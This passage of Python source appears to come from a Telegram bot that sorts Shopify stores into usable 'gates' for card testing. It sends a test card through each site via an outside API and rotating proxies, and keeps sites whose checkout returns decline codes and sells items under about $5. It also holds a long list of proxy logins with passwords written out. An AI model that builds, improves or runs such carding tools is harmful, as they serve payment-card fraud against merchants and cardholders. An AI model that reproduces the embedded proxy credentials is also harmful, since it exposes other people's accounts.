    "geo.floppydata.com:10080:urqvgFGUD13Ss1bd:qszfzhTxLDXpFPUB",
    "geo.floppydata.com:10080:sAHYvYBynjx5Fomi:SXEFNA1TMQ8CitK1",
    "geo.floppydata.com:10080:O8CodsqseJjSg3pL:OU7tgGLimpxSwh3Q",
    "geo.floppydata.com:10080:X0BL9ZhcSLmhzK5L:ufsTglsFUzBLrcgZ",
    "geo.floppydata.com:10080:wpwhHz7ixUVqYXpO:Vk0yceLqCQViTq2Z",
    "geo.floppydata.com:10080:3oIdQSVpWhMRwaUG:ctkNdyHrhH24AmCy",
    "geo.floppydata.com:10080:UpRvbC2Z025e7dFf:n6BBkbIXgq4nVn1y",
    "geo.floppydata.com:10080:EvAgBXqgXI58jTM8:L59jjJQcELIX0g5I",
    "geo.floppydata.com:10080:8N7S7VNInlTNQgnf:2jHnfdQTPqhYtlwZ",
    "geo.floppydata.com:10080:vbII8GYjaRy0gg6j:4i7tukB9IPmhIvtX",
    "geo.floppydata.com:10080:E6x20sfGdpPi2aZg:2xybN5mkEqXyPbKV",
    "geo.floppydata.com:10080:iNEEyqeBuNpbOwNm:060fD0RTQsaTeE3d",
    "geo.floppydata.com:10080:VCKq8HGgLSnn2mDN:eZ99usEP77YnHola",
    "geo.floppydata.com:10080:Fobo2tOGAvgoH7O4:QFZKvEoAyMK8rZUu",
    "geo.floppydata.com:10080:KECGVnPyo2D6meO8:vUqUCIlgKzfCIkW8",
    "geo.floppydata.com:10080:zcAxpHtcdQztjc0j:L72Lvs6VnCisyej8",
    "geo.floppydata.com:10080:AhSMLje8ayHifJtw:FVhB7f6LkRcr1AhW",
    "geo.floppydata.com:10080:iYEJBTig8o1AKfvb:9iMwhmMpMPfVemGE",
    "geo.floppydata.com:10080:dcFWOOqTjEIEgUxL:GJpHQEW1xBEJL0Q1",
    "geo.floppydata.com:10080:3JNFgb1xYa8WuXiy:Ijnoh7Sigpx80FY0",
    "geo.floppydata.com:10080:TQYsIEwIWFIG2V5B:s3bajCvlIX5JWtwE",
    "geo.floppydata.com:10080:Y8FzbBh9nNIleZMP:tlesmLZyO3BmPKZg",
    "geo.floppydata.com:10080:ouy2MmNKssBPCmM6:ON9shuDJddLSL4rN",
    "geo.floppydata.com:10080:E4J8bK7Hb4gbAhqH:Uul7VjnfBLquEig5",
    "geo.floppydata.com:10080:yJsb1YnL422wsT1f:kIYX7Z7ZXLGk8f04",
    "geo.floppydata.com:10080:F8boMzYDPdxiyPCJ:9a1AUQwKe1fBG2RA",
    "geo.floppydata.com:10080:qEwZT1rwxMks2UE0:hEqotKR6uBUWqkKc",
    "geo.floppydata.com:10080:QD0J5fpfZUHsPCuc:6kMDoYq5ZubHi2km",
    "geo.floppydata.com:10080:NnNM75yIk93Bq0hs:ZtdYvRyM4Qbo0hKK",
    "geo.floppydata.com:10080:D9vB4BoI9JqDWGgo:IsqhstQHDUV4G7th",
    "geo.floppydata.com:10080:SCgw6PUCaGj6vG9W:vmzPDlFmrc26UlT5",
    "geo.floppydata.com:10080:fEklRdI3dWEhWgMk:zIUWpsXz9gz1Q6ol",
    "geo.floppydata.com:10080:A4FrvippMQrxh3Co:Tx5SyklJGgmzSylW",
    "geo.floppydata.com:10080:B73WNXIzk1AsEuix:Gg1LuSAB6ZtuXD4G",
    "geo.floppydata.com:10080:5xPO7k9imRmyTvxo:hiyTVyD4hvIcz7Ru",
    "geo.floppydata.com:10080:xS634iajUK99DiH0:muFQHkUN9OShYAlU",
    "geo.floppydata.com:10080:Pci7ZT8LgvFmVt3p:LRBgHF4UXXsdgvve",
    "geo.floppydata.com:10080:5qoAKvzFtDhTXyog:h7ipJxQkiwO28jbz",
    "geo.floppydata.com:10080:N0KGbd9plH8HOtJK:AhObh4zkQ8aX7lEW",
    "geo.floppydata.com:10080:30aO4cdESeyzSk88:qzdTnwVu2i5UUuzZ",
    "geo.floppydata.com:10080:4HqBhvTGWCfO0fhy:hEZMWihBgB0oDPXH",
    "geo.floppydata.com:10080:77wJbDSAYxgjzcPG:Ig00iAQOdfu1na8e",
    "geo.floppydata.com:10080:8dgWE60gYzEOcOpD:Ts0xOqGYJPaC3NpI",
    "geo.floppydata.com:10080:KjRnF5cOlhSKHbBt:Y477dexLVvSUXyhH",
    "geo.floppydata.com:10080:YjygmupMHdm3hBei:3srioTCxNpA7BwK2",
    "geo.floppydata.com:10080:8ALR0Iys07jiBJFb:mBgXU8LN4Kou67ud",
    "geo.floppydata.com:10080:F5NEBO8zmymLraSv:YeiFzBIwMl8FJcFl",
    "geo.floppydata.com:10080:7tQCmn0echQuvsho:iBxUfB0Xbdfmwaqe",
    "geo.floppydata.com:10080:drBcTYchmwxJmogW:X6rASrYWJTlg8ypP",
    "geo.floppydata.com:10080:XP4MPP7ehU4KS0qL:UWms4TXAN4lhdAd4",
    "geo.floppydata.com:10080:XlIHlW63Zv0mvmt8:uHKHhN9c9iGgapHf",
    "geo.floppydata.com:10080:9vFX55eGuifFH77x:8N1AmaSetQ8PcZYF",
    "geo.floppydata.com:10080:uUUjhHBHFV1SOYBl:Lr3nZgDcuCwgy9pn",
    "geo.floppydata.com:10080:WMwq2VRN2LB3hNAb:n2m1UC7OR2QwvfJa",
    "geo.floppydata.com:10080:irSz3jEhcXKdFR0T:gSUzEubjUu4ztaXu",
    "geo.floppydata.com:10080:JUlEu5ZQmOVY9yBo:1ennUfVuOXcU7Rqi",
    "geo.floppydata.com:10080:EyvNnyPYTywmZdHs:A1clTmbYzlCIdmRY",
    "geo.floppydata.com:10080:hbtUSBfUEIffRIZ3:EUZ2WLSOAhbbWvgz",
    "geo.floppydata.com:10080:IxBOoDtqARo4DH5P:e79Cr8pNSvbaLmz9",
    "geo.floppydata.com:10080:vekxdW65Nwqiuxlk:Iajumc0xJuBOjGH7",
    "geo.floppydata.com:10080:h6UP8WLtFofBsuxM:kjifa9ZzkygKnSN0",
    "geo.floppydata.com:10080:vr0wM6GqxkjE2TC2:J9Iv63AC8cSmIYpZ",
    "geo.floppydata.com:10080:JuXZsxQWiWpSwjkS:DjeHARYw86IHxLDZ",
    "geo.floppydata.com:10080:Vj6RklkGV6ddklKb:oc809Nop0LJDzwXw",
    "geo.floppydata.com:10080:9ZLcfqfs0zOjxTPd:18pqTdoUQDs4edLh",
    "geo.floppydata.com:10080:EJxUuC5QhHWHaP5G:3SuqD0to9JKC0Vm6",
    "geo.floppydata.com:10080:6a8SS85DwKdd2pss:st0yjwZ0XXrcaNqU",
    "geo.floppydata.com:10080:NHhdTW2lS6XQJBwz:FcaGp4oZGD7WSDrM",
    "geo.floppydata.com:10080:VamhmF2OJ4V7NiJV:8JE3RGn2ZSP8JeXa",
    "geo.floppydata.com:10080:LHGqOLJrzfdiJE4X:Frso7vuhTbvE9By3",
    "geo.floppydata.com:10080:Y9iks1JVQOjWfrAe:MymTWP3JRog1vAvc",
    "geo.floppydata.com:10080:ZUsYVBBeMrDnhNHx:0fidtpyaEKMX7bqU",
    "geo.floppydata.com:10080:aK4nclBQ4WwcbWYA:hhg1gEwW3M25eDev",
    "geo.floppydata.com:10080:X5nJHRZXAz3ON0b1:uBPFVPBt2Tiw9aRf",
    "geo.floppydata.com:10080:3Z09t2r7dkOb2P5L:EMQxP4fQy4WKUIc0",
    "geo.floppydata.com:10080:YMvbQdl5DqDfnn05:irqQgZzhg73vKNZi",
    "geo.floppydata.com:10080:53AUA6GIZwOjgrYW:psMTcDwP3P28wyff",
    "geo.floppydata.com:10080:J0vI99QIXpbnGujg:Epq0rXvPoR5NrPYd",
    "geo.floppydata.com:10080:OibSvjOADdGcV3wl:P9k5JIkVXzlg6iDX",
    "geo.floppydata.com:10080:j0nQsqD6BYzLxqVn:gYwh3ZQ6c5a5gFX6",
    "geo.floppydata.com:10080:U9GN2jPLSwVRJVx8:VX0XdytbjlpXj6sJ",
    "geo.floppydata.com:10080:tdYssrYs9Z4ZULjw:8WmmU7VZWxZpkIoC",
    "geo.floppydata.com:10080:cvYV3kq0AcYc87PO:WmUOA3ZfxpuYoqud",
    "geo.floppydata.com:10080:q0LmjOVos4Ds3kJg:GexICjyqDis4ueqa",
    "geo.floppydata.com:10080:P66cut7qT69dwKPa:S9AXqMFGXZ2FKpiK",
    "geo.floppydata.com:10080:U7ddljNj6xHPdmzw:CNwYX0xF6CurrXbI",
    "geo.floppydata.com:10080:ChIvzk4y6soZWmkP:1IChQS4tPErtSaea",
    "geo.floppydata.com:10080:KNm05ZGUm04fhKQZ:t1q8H488THkK3M1H",
    "geo.floppydata.com:10080:1OEG8NrblCxotPhj:ry1lIQhK0tMKB3zH",
]

# Bad proxies that failed - removed from rotation
BAD_PROXIES = set()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FIX #4: Cleaned up DEAD_ERRORS
#
# REMOVED from the old list (were incorrectly killing valid sites):
#   - 'step 0 failed' thru 'step 10 failed'  ← 429 rate-limit on products.json
#     is NOT a dead site; it just means the catalog endpoint is throttled.
#     These are now handled by a dedicated 429-retry path instead.
#
# KEPT: true hard errors that definitely mean the site is broken/unusable.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DEAD_ERRORS = [
    'site error! status: 404',
    'site error! status: 500',
    'site error! status: 402',
    'site error! status: 502',
    'site error! 503',
    'site error! status: 503',
    'site not supported for now!',
    'not shopify!',
    'payment method is not shopify!',
    'connection error',
    'connection error!',
    'failed to get token',
    'failed to get checkout',
    'failed to add to cart',
    'site overloaded',
    'no valid products',
    'site error! status: 403',
    'site error! status: 401',
    'site requires login!',
    'json',
    'proxy',
    'curl error',
    'could not resolve',
    'connect tunnel failed',
    'missing stableid',
    'missing buildid',
    'missing sourcetoken',
    'could not extract private_access_token',
    'could not find actions js url',
    'missing proposal',
    'missing submit id',
    'retryable: inventory reservation failure',
    'exceeded 30 poll attempts',
    'could not extract queuetoken',
    'could not extract identification signature',
    'could not extract session id',
    'could not extract delivery handle',
    'could not extract signedhandles',
    'could not extract shipping amount',
    'could not extract total amount',
    'could not extract receiptid',
    'could not extract sessiontoken',
    'errstoreincompatible',
    'errmissingreceiptid',
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FIX #5: Responses that indicate the site is rate-limited but NOT dead
# These trigger a retry-with-delay instead of instant rejection.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RATE_LIMIT_PATTERNS = [
    'status 429',
    'status: 429',
    'site rate limited',
    'site overloaded',
    'too many requests',
    'rate limit',
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FIX #6: Cleaned REJECT_RESPONSES — removed overly broad patterns:
#   REMOVED: 'failed'      ← matched "Step 0 failed" and even "failed" in valid msgs
#   REMOVED: 'ERROR'       ← matched "Processing Error" (which is in SUCCESS_RESPONSES!)
#   REMOVED: 'EXCEPTION'   ← too broad
#   REMOVED: 'item'        ← matched almost anything
#   REMOVED: 'resolve'     ← matched "could not resolve" but also valid payloads
#   REMOVED: 'server error'← too broad
#   REMOVED: 'client error'← too broad
#   REMOVED: 'status: 429' ← moved to RATE_LIMIT_PATTERNS (retry, not reject)
#   REMOVED: 'timeout'     ← now handled by retry logic, not instant-reject
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
REJECT_RESPONSES = [
    'VALIDATION_CUSTOM',
    'MERCHANDISE_EXPECTED_PRICE_MISMATCH',
    'Site not supported',
    'Site not supported for now!',
    'r4 token empty',
    'r2 id empty',
    'product not found',
    'hcaptcha detected',
    'HCAPTCHA_DETECTED',
    'HCAPTCHA',
    'tax ammount empty',
    'del ammount empty',
    'product id is empty',
    'py id empty',
    'clinte token',
    'RECEIPT_EMPTY',
    'receipt_empty',
    'Site requires login!',
    'Failed to get token',
    'No Valid Products',
    'Not Shopify!',
    'Site Error! Status: 404',
    'Site Error! Status: 401',
    'Site Error! Status: 402',
    'Failed to get checkout',
    'Captcha at Checkout',
    'Connection Error!',
    'Error processing card',
    'amount_too_small',
    'Token Not Found',
    'INVALID_RESPONSE',
    'Could not resolve host',
    'CONNECT tunnel failed',
    'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'Submit Rejected: DELIVERY_COMPANY_REQUIRED',
    'SITE DEAD 01', 'SITE DEAD 02', 'SITE DEAD 03', 'SITE DEAD 04', 'SITE DEAD 05',
    'SITE DEAD 06', 'SITE DEAD 07', 'SITE DEAD 08', 'SITE DEAD 09',
    'No redirect URL found',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED',
    'WAITING_PENDING_TERMS',
    'MERCHANDISE_OUT_OF_STOCK',
    'GENERIC_ERROR',
    'status: 500',
    'status: 502',
    'status: 503',
    'status: 504',
    'status: 403',
    'status: 401',
    'status: 404',
    'Connection refused',
    'SSL certificate problem',
    'JSON parse error',
    'Invalid response',
    'Empty response',
    'No response',
    'Dead site',
    'Broken site',
    'Not accessible',
    'Domain expired',
    'Suspended',
    'Parked domain',
    'LANDING_PAGE_NOT_FOUND',
    'REDIRECT_LOOP',
    'TOO_MANY_REDIRECTS',
    'HOST_NOT_REACHABLE',
    'NETWORK_UNREACHABLE',
    'DNS_PROBE_FINISHED_NXDOMAIN',
    'ERR_NAME_NOT_RESOLVED',
    'ERR_CONNECTION_REFUSED',
    'ERR_CONNECTION_TIMED_OUT',
    'ERR_SSL_PROTOCOL_ERROR',
    'cURL error',
    'Change Proxy or Site',
    'NA',
    'Unknown Response: error:',
]

# List of valid gateway responses (Site is Alive)
SUCCESS_RESPONSES = [
    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
    'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR', 'Processing Error', 'EXPIRED_CARD',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED', '3DS_REQUIRED', 'AMOUNT_TOO_SMALL',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'ORDER_PAID', 'INCORRECT_NUMBER', 'DS_REQUIRED', 'CAPTCHA_REQUIRED',
]

# Router for this module
router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

def read_sites():
    """Read sites from sites.txt file - returns list without duplicates"""
    if not os.path.exists("sites.txt"):
        return []
    with open("sites.txt", "r", encoding="utf-8") as f:
        sites = list(set([line.strip() for line in f if line.strip()]))
    return sites

def write_sites(sites_list):
    """Write sites to sites.txt file - ENSURES NO DUPLICATES"""
    unique_sites = list(set(sites_list))
    with open("sites.txt", "w", encoding="utf-8") as f:
        for site in unique_sites:
            f.write(f"{site}\n")
    return len(unique_sites)

def normalize_url(url: str) -> str:
    """Normalize URL to prevent duplicates with slight variations"""
    url = url.strip().lower()
    url = url.rstrip('/')
    url = re.sub(r'^https?://', '', url)
    if url.startswith('www.'):
        url = url[4:]
    return url

def get_random_proxy():
    """Get a random proxy that isn't in the bad list"""
    global BAD_PROXIES
    available = [p for p in PROXY_LIST if p not in BAD_PROXIES]
    if not available:
        BAD_PROXIES.clear()
        available = PROXY_LIST
    return random.choice(available)

def mark_proxy_bad(proxy):
    """Mark a proxy as bad"""
    global BAD_PROXIES
    BAD_PROXIES.add(proxy)

def is_success_response(response_msg: str) -> bool:
    """Check if response is a valid gateway response (success)"""
    response_upper = response_msg.upper()
    for success in SUCCESS_RESPONSES:
        if success.upper() in response_upper:
            return True
    return False

def is_rate_limited(response_msg: str) -> bool:
    """
    FIX: Check if the site is rate-limited (429) — should retry, NOT reject.
    This was previously being caught by DEAD_ERRORS/REJECT_RESPONSES and
    causing valid sites to be wrongly removed.
    """
    response_lower = response_msg.lower()
    for pattern in RATE_LIMIT_PATTERNS:
        if pattern.lower() in response_lower:
            return True
    return False

def is_reject_response(response_msg: str) -> bool:
    """Check if response indicates site should be rejected/removed"""
    response_lower = response_msg.lower()

    # FIX: Check rate-limit FIRST — if it's a 429, do NOT reject (handle via retry)
    if is_rate_limited(response_msg):
        return False

    for reject in REJECT_RESPONSES:
        if reject.lower() in response_lower:
            return True

    for dead in DEAD_ERRORS:
        if dead.lower() in response_lower:
            return True

    return False

def extract_currency_from_price(price_str: str) -> str:
    """Extract currency symbol from price string or return default"""
    if not price_str or price_str == "-1.0":
        return "USD"
    if '$' in price_str:
        return "USD"
    elif '€' in price_str:
        return "EUR"
    elif '£' in price_str:
        return "GBP"
    elif '¥' in price_str:
        return "JPY"
    elif '₹' in price_str:
        return "INR"
    elif 'A$' in price_str or 'AU$' in price_str:
        return "AUD"
    elif 'C$' in price_str or 'CA$' in price_str:
        return "CAD"
    elif 'CHF' in price_str:
        return "CHF"
    elif 'NZ$' in price_str:
        return "NZD"
    else:
        return "USD"

def format_price_with_currency(price, currency):
    """Format price with appropriate currency symbol"""
    try:
        price_float = float(price)
        if price_float < 0:
            return "$0.00"
    except Exception:
        return "$0.00"

    currency_symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥",
        "INR": "₹", "AUD": "A$", "CAD": "C$", "CHF": "CHF", "NZD": "NZ$"
    }
    symbol = currency_symbols.get(currency.upper(), "$")
    return f"{symbol}{price_float:.2f}"

async def call_site_check_api(site_url: str, cc_formatted: str, proxy: str) -> dict:
    """
    Call the shopii API for site checking.
    FIX: Uses increased timeout (45s) and properly classifies 429 separately.
    """
    api_url = f"{API_BASE_URL}?site={site_url}&cc={cc_formatted}&proxy={proxy}"

    try:
        timeout = aiohttp.ClientTimeout(
            total=API_TIMEOUT,
            connect=15,       # FIX: Separate connect timeout
            sock_read=API_TIMEOUT
        )
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=timeout, ssl=False) as resp:
                if resp.status != 200:
                    return {
                        "success": False,
                        "response": f"HTTP Error {resp.status}",
                        "price": "-1.0",
                        "proxy_status": "Dead",
                        "gateway": "",
                        "currency": "USD",
                        "error": f"HTTP_{resp.status}"
                    }

                try:
                    data = await resp.json(content_type=None)
                except Exception as e:
                    # Try reading as text in case content-type header is wrong
                    try:
                        text = await resp.text()
                        import json as _json
                        data = _json.loads(text)
                    except Exception:
                        return {
                            "success": False,
                            "response": f"Invalid JSON Response: {str(e)[:50]}",
                            "price": "-1.0",
                            "proxy_status": "Dead",
                            "gateway": "",
                            "currency": "USD",
                            "error": "JSON_PARSE_ERROR"
                        }

                response_msg = data.get("Response", "Unknown")
                price_str = data.get("Price", "-1.0")
                proxy_raw = data.get("Proxy", "Dead")
                gateway = data.get("Gateway", "Unknown")
                status = data.get("Status", "false")
                currency = data.get("Currency", "USD")

                if not currency or currency == "USD":
                    currency_from_price = extract_currency_from_price(price_str)
                    if currency_from_price:
                        currency = currency_from_price

                if "live" in str(proxy_raw).lower():
                    proxy_status = "Live"
                else:
                    proxy_status = "Dead"

                # FIX: Tag rate-limit responses so retry logic can handle them
                is_429 = is_rate_limited(response_msg)

                return {
                    "success": True,
                    "response": response_msg,
                    "price": price_str,
                    "proxy_status": proxy_status,
                    "gateway": gateway,
                    "currency": currency,
                    "status": status,
                    "error": "RATE_LIMITED" if is_429 else None,
                    "raw_data": data
                }

    except asyncio.TimeoutError:
        return {
            "success": False,
            "response": "Timeout Error",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "currency": "USD",
            "error": "TIMEOUT"
        }
    except aiohttp.ClientConnectorError as e:
        error_str = str(e).lower()
        if "proxy" in error_str or "tunnel" in error_str:
            return {
                "success": False,
                "response": f"Proxy Error: {str(e)[:60]}",
                "price": "-1.0",
                "proxy_status": "Dead",
                "gateway": "",
                "currency": "USD",
                "error": "PROXY_ERROR"
            }
        return {
            "success": False,
            "response": f"Connection Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "currency": "USD",
            "error": "CONNECTION_ERROR"
        }
    except aiohttp.ClientError as e:
        return {
            "success": False,
            "response": f"Client Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "currency": "USD",
            "error": "CLIENT_ERROR"
        }
    except Exception as e:
        return {
            "success": False,
            "response": f"Error: {str(e)[:60]}",
            "price": "-1.0",
            "proxy_status": "Dead",
            "gateway": "",
            "currency": "USD",
            "error": "UNKNOWN_ERROR"
        }

async def check_site_status(site_url: str) -> tuple:
    """
    Checks a single site using the API with a test card.
    Returns: (site_url, status, data_dict, final_response_string)

    FIX: Proper retry logic that handles:
      - 429 rate-limit: retry with delay + different proxy (was: instant-reject)
      - Timeout: retry with delay + different proxy
      - Proxy error: retry with different proxy immediately
    """
    # RETRYABLE error types — switch proxy and sleep, then try again
    RETRYABLE = {"PROXY_ERROR", "TIMEOUT", "CONNECTION_ERROR", "RATE_LIMITED"}

    last_response_msg = "Max Retries Reached"
    last_gateway = "Unknown"
    last_currency = "USD"

    for attempt in range(MAX_RETRIES):
        proxy = get_random_proxy()

        result = await call_site_check_api(
            site_url=site_url,
            cc_formatted=TEST_CARD,
            proxy=proxy
        )

        response_msg = result.get("response", "Unknown")
        price_str = result.get("price", "-1.0")
        proxy_status = result.get("proxy_status", "Dead")
        gateway = result.get("gateway", "Unknown")
        currency = result.get("currency", "USD")
        error_type = result.get("error")

        last_response_msg = response_msg
        last_gateway = gateway
        last_currency = currency

        print(f"[DEBUG] Site: {site_url} | Attempt: {attempt+1}/{MAX_RETRIES} | "
              f"Response: {response_msg} | Price: {price_str} | "
              f"Currency: {currency} | Gateway: {gateway}")

        # Mark bad proxies
        if proxy_status.lower() != "live":
            mark_proxy_bad(proxy)

        # ── FIX: Retry on rate-limit or transient errors ──────────────────
        if error_type in RETRYABLE and attempt < MAX_RETRIES - 1:
            if error_type == "RATE_LIMITED":
                print(f"[RETRY] {site_url} | 429 Rate Limited — retrying in {RETRY_DELAY_429}s with new proxy")
                await asyncio.sleep(RETRY_DELAY_429)
            elif error_type == "TIMEOUT":
                print(f"[RETRY] {site_url} | Timeout — retrying in {RETRY_DELAY_TIMEOUT}s with new proxy")
                await asyncio.sleep(RETRY_DELAY_TIMEOUT)
            else:
                # Proxy / connection error — switch proxy immediately
                await asyncio.sleep(0.5)
            continue
        # ─────────────────────────────────────────────────────────────────

        # Hard failure (no valid HTTP response from our API)
        if not result.get("success"):
            # Don't give up on timeout/proxy after all retries — mark as error
            return site_url, "REMOVE", {
                "Price": -1.0,
                "Gateway": gateway,
                "Currency": currency
            }, response_msg

        # Check if response indicates a truly DEAD/broken site
        if is_reject_response(response_msg):
            return site_url, "REMOVE", {
                "Price": -1.0,
                "Gateway": gateway,
                "Currency": currency
            }, response_msg

        # FIX: If still rate-limited after all retries, don't remove — mark separately
        if is_rate_limited(response_msg):
            print(f"[RATE-LIMITED AFTER RETRIES] {site_url} — keeping as UNKNOWN (not removing)")
            return site_url, "RATE_LIMITED", {
                "Price": -1.0,
                "Gateway": gateway,
                "Currency": currency
            }, f"Rate Limited (429) — Could not verify after {MAX_RETRIES} attempts"

        # Check if response is a SUCCESS response (Valid gateway — Site is Alive)
        if is_success_response(response_msg):
            actual_price = -1.0
            if price_str and price_str != "-1.0":
                clean_price = re.sub(r'[^\d.]', '', str(price_str))
                if clean_price:
                    try:
                        actual_price = float(clean_price)
                    except ValueError:
                        actual_price = -1.0

            # PRICE CONSTRAINT: Must be between $0 and $20
            if 0.00 <= actual_price <= 5.00:
                formatted_price = format_price_with_currency(actual_price, currency)
                msg_display = f"{formatted_price} | {response_msg}"
                return site_url, "KEEP", {
                    "Price": actual_price,
                    "Gateway": gateway,
                    "Currency": currency
                }, msg_display
            else:
                formatted_price = format_price_with_currency(actual_price, currency)
                return site_url, "REMOVE", {
                    "Price": actual_price,
                    "Gateway": gateway,
                    "Currency": currency
                }, f"Price {formatted_price} out of range | {response_msg}"

        # Truly unknown response after a successful API call
        return site_url, "REMOVE", {
            "Price": -1.0,
            "Gateway": gateway,
            "Currency": currency
        }, f"Unknown Response: {response_msg}"

    # Exhausted all retries
    return site_url, "ERROR", {
        "Price": -1.0,
        "Gateway": last_gateway,
        "Currency": last_currency
    }, last_response_msg

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND WORKER FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_site_checker(bot: Bot, chat_id: int, sites_to_check, command_name="Audit", status_message_id=None):
    """
    Run site checking process with DUPLICATE PREVENTION.
    FIX: Concurrency reduced to CONCURRENT_CHECKS (10) to avoid timeout cascades.
    """
    global BAD_PROXIES
    BAD_PROXIES.clear()

    total_sites = len(sites_to_check)
    valid_sites = []
    working_sites_content = []
    checked_count = 0
    live_count = 0
    dead_count = 0
    rate_limited_count = 0
    duplicate_count = 0

    last_edit_time = 0
    MIN_EDIT_INTERVAL = 2.0
    CHECKS_PER_UPDATE = 10

    # FIX: Reduced from 50 → CONCURRENT_CHECKS (10) to prevent mass timeouts
    sem = asyncio.Semaphore(CONCURRENT_CHECKS)

    # Get existing sites for duplicate checking
    existing_sites = []
    if command_name == "Adding":
        existing_sites = await asyncio.to_thread(read_sites)
        print(f"[CHECKSITE] Found {len(existing_sites)} existing sites for duplicate check")

    async def worker(site):
        async with sem:
            return await check_site_status(site)

    tasks = [worker(site) for site in sites_to_check]

    for future in asyncio.as_completed(tasks):
        try:
            site, status, data, resp_msg = await future
        except Exception as e:
            checked_count += 1
            dead_count += 1
            print(f"[LOG] Worker exception: {e}")
            continue

        checked_count += 1

        price = data.get("Price", -1.0) if isinstance(data, dict) else -1.0
        gateway = data.get("Gateway", "Unknown") if isinstance(data, dict) else "Unknown"
        currency = data.get("Currency", "USD") if isinstance(data, dict) else "USD"

        print(f"[LOG] {site} | {resp_msg} | Gateway: {gateway} | Currency: {currency}")

        if status == "KEEP":
            normalized_site = normalize_url(site)

            # Check if site already exists in the current batch
            normalized_valid = {normalize_url(s) for s in valid_sites}
            if normalized_site in normalized_valid:
                duplicate_count += 1
                print(f"[DUPLICATE SKIPPED] {site} duplicate in batch!")
                continue

            # Check if site already exists in existing sites (for Adding command)
            if command_name == "Adding":
                normalized_existing = {normalize_url(s) for s in existing_sites}
                if normalized_site in normalized_existing:
                    duplicate_count += 1
                    print(f"[DUPLICATE SKIPPED] {site} already exists!")
                    continue

            live_count += 1
            valid_sites.append(site)

            price_display = format_price_with_currency(price, currency)
            working_sites_content.append(
                f"{site} | Price: {price_display} | Response: {resp_msg} | Gateway: {gateway} | Currency: {currency}"
            )

        elif status == "RATE_LIMITED":
            # FIX: Rate-limited sites are tracked separately — not counted as dead
            rate_limited_count += 1
        else:
            dead_count += 1

        # Update progress message
        current_time = time.time()
        if (current_time - last_edit_time > MIN_EDIT_INTERVAL) or (checked_count % CHECKS_PER_UPDATE == 0):
            try:
                if status_message_id:
                    dup_text = ""
                    if duplicate_count > 0:
                        dup_text = f"\n<tg-emoji emoji-id=\"6136172917702008149\">👌</tg-emoji> <b>Duplicates Skipped:</b> <code>{duplicate_count}</code>"
                    rate_text = ""
                    if rate_limited_count > 0:
                        rate_text = f"\n⏳ <b>Rate Limited (429):</b> <code>{rate_limited_count}</code>"

                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=status_message_id,
                        text=f"<tg-emoji emoji-id=\"4949560993840629085\">😅</tg-emoji> <b>{command_name}ing {total_sites} Sites...</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                        f"<tg-emoji emoji-id=\"6082192961272027437\">☑️</tg-emoji> <b>Kept ($0-20):</b> <code>{live_count}</code>\n"
                        f"<tg-emoji emoji-id=\"5116151848855667552\">🚫</tg-emoji> <b>Rejected:</b> <code>{dead_count}</code>\n"
                        f"<tg-emoji emoji-id=\"5850526539904453814\">🔘</tg-emoji> <b>Checked:</b> <code>{checked_count}/{total_sites}</code>\n"
                        f"<tg-emoji emoji-id=\"5447602197439218445\">🌐</tg-emoji> <b>Proxies Available:</b> <code>{len(PROXY_LIST) - len(BAD_PROXIES)}/{len(PROXY_LIST)}</code>"
                        f"{rate_text}{dup_text}",
                        parse_mode="HTML"
                    )
                    last_edit_time = current_time
            except Exception as e:
                print(f"[ERROR] Failed to update status message: {e}")
                pass

    # FINAL DEDUPLICATION before saving
    final_unique_sites = []
    seen_normalized = set()

    for site in valid_sites:
        normalized = normalize_url(site)
        if normalized not in seen_normalized:
            seen_normalized.add(normalized)
            final_unique_sites.append(site)

    removed_dupes = len(valid_sites) - len(final_unique_sites)
    if removed_dupes > 0:
        print(f"[CHECKSITE] Removed {removed_dupes} internal duplicates before saving")

    # Save results based on command type
    if command_name == "Audit":
        saved_count = await asyncio.to_thread(write_sites, final_unique_sites)
    elif command_name == "Adding":
        existing = await asyncio.to_thread(read_sites)
        existing_normalized = {normalize_url(s) for s in existing}

        combined = list(existing)
        for new_site in final_unique_sites:
            norm_new = normalize_url(new_site)
            if norm_new not in existing_normalized:
                combined.append(new_site)
                existing_normalized.add(norm_new)

        saved_count = await asyncio.to_thread(write_sites, combined)

    # Generate report
    filename = f"report_{command_name.lower()}_{int(time.time())}.txt"

